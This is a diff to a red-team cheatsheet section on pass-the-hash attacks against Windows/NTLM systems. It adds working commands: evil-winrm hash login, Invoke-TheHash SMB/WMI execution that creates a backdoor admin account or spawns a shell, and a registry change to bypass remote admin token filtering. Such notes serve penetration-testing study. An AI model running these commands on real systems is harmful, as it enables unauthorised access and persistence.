@@ -278,13 +278,25 @@ PS> .\LaZagne.exe all
 
 There are some scenarios in which we got hold of a hash, but haven't managed to crack it. We may try to use the hash.
 
-* Legacy systems using NTLM instead of Kerberos <small>(or alternatives)</small> may be vulnerable as hashes are not salted and may be reused
+Legacy systems using NTLM instead of Kerberos <small>(or alternatives)</small> may be vulnerable as hashes are not salted and may be reused.
+
+* Protocol-specific tools (examples)
 
 ```shell!
 $ evil-winrm -i IP -u username -H "hash" # WinRM protocol
 ```
 
-We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool.
+* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool.
+
+* We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.4k ⭐, 2018 🪦)</small> script suite. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.
+
+```shell!
+PS> Import-Module .\Invoke-TheHash.psd1
+PS> Invoke-SMBExec -Target IP -Domain xxx -Username xxx -Hash xxx -Command "net user xxx Password123 /add && net localgroup administrators xxx /add" -Verbose
+PS> Invoke-WMIExec -Target DC01 -Domain xxx.xxx -Username xxx -Hash xxx -Command "cmd.exe"
+```
+
+⚠️ We cannot remotely access a local administrator account by default. If `FilterAdministratorToken` is disabled, you can set  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` to 1 to by-pass this check.
 </div><div>
 </div></div>
 
